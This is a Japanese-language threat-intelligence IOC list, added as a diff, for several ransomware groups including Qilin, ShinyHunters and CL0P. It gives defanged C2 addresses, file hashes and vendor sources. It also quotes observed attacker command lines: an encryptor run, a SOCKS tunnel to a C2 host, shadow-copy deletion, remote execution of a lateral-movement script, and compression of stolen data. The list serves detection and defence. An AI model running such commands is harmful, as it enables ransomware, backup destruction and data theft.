@@ -1,0 +1,57 @@
+■The Gentlemen
+IP 193.233.202[.]17 SOCKS Proxy C2として観測
+IP 77.110.122[.]137 SOCKS Proxy C2として観測
+
+ドメイン 公開情報から確認できず
+
+ファイルハッシュ
+f918535f974591ef031bd0f30a8171e3da27a6754e6426a8ba095f83195661c8　SHA-256 / Encryptor
+30b49ae2f685d4403d3013410f80c2e2　SHA-256 / Ransomware Encryptor
+
+コマンドライン
+win.exe --password [REDACTED] --T 200 --superfast　Encryptor実行
+svchost32.exe client 193.233.202[.]17:44729 R:1081:socks　C2接続
+
+
+出典：Bitsight, The Gentlemen Ransomware Group: Threat Actor Profile, 2026/08/26 Microsoft Threat Intelligence, The Gentlemen ransomware: Dissecting a self-propagating Go encryptor, 2026/05/28 Huntress, The Gentleman Ransomware – Defense Evasion TTPs Uncovered, 2026
+Huntress
+
+
+■Anubis Ransomware
+出典：Arctic Wolf Labs, From CitrixBleed 2 to Cloudflared: The Tools and Techniques Behind Anubis Ransomware Attacks, 2026/06/30 F5 Labs, Weekly Threat Bulletin – August 19th, 2026, 2026/08/19
+
+
+■Qilin Ransomware
+IP 185.93.89[.]100　攻撃元IP
+IP 193.46.255[.]73　通信先IP
+ドメイン　公開情報から確認できず
+URL　wss://193.46.255[.]73:443/agent.ashx　攻撃関連通信先
+ファイルハッシュ　76F860A0E238231C2AC262901CE447E83D840E16FCA52018293C6CF611A6807E　Windows
+ファイルハッシュ　CD27A31E618FE93DF37603E5ECE3352A91F27671EE73BDC8CE9AD793CAD72A0F　Linux/ESXi
+コマンドライン　vssadmin delete shadows /all /quiet　Shadow Copy削除 ※単独では悪性を示さない
+出典： CSIRT Italia / CSIRT Toscana, Qilin: campagne di sfruttamento sistematico e diffusione del ransomware sul territorio nazionale, 2026/05/29 Check Point Research, Active Exploitation of Check Point VPN Authentication Bypass (CVE-2026-50751), 2026/06/08 Red Piranha, Threat Intelligence Report Jun 2 - Jun 8 2026, 2026/06
+
+■ShinyHunters
+IP　142.11.200[.]186 ～ 142.11.200[.]190　Staging / C2インフラ
+　　176.120.22[.]24　ShinyHunters DLSのclearnet mirror
+ドメイン　azurenetfiles[.]net　MeshCentral C2
+ファイルハッシュ　f02a924c9ff92a8780ce812511341182c6b509d45bc59f3f7b522e37225d24fc　Windows MeshCentral Agent
+　　　　　　　　　68257a6f9ff196179ec03624e849927f26599eb180a7c82e14ef5bc4e93bc309　 Linux MeshAgent
+コマンドライン　node meshctrl.js RunCommand --loginuser admin --loginpass '[password]' --id '[agent_id]' --run 'bash /tmp/[victim_abbreviation]_fanout.sh'　横展開スクリプト実行
+　　　　　　　　pv -s "$(du -sb exfil | awk '{print $1}')" | zstd -3 -T0 -o exfil.tar.zst　窃取データの圧縮に利用
+出典： Google Threat Intelligence Group / Mandiant, ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit, 2026/06/11
+
+■CL0P Ransomware
+IP 5.180.41[.]35 C2
+79.141.160[.]78 C2／実インシデントで観測
+ドメイン　公開情報から確認できず
+ファイルハッシュ：321e1fb01eb3462b48ff6ccdef132acc1182e3f7456548439f0d4ead12fd98bf　カスタムWebshell
+55a1eb4c2d3da04376df39d7ba832569c6af1a37a0cf2b95f754ac898023a30c　JSP Webshell
+コマンドライン　公開情報から確認できず　-
+
+出典： PTC, Remote Code Execution Vulnerability in PTC’s Windchill and FlexPLM Solutions, 2026/06〜07 更新 Ransom-ISAC, Cl0p Exploitation of PTC Windchill & FlexPLM (CVE-2026-12569), 2026/07、2026/08更新 ReliaQuest, Clop Returns with Custom Implant in Mass-Extortion Campaign, 2026/08
+
+
+
+
+
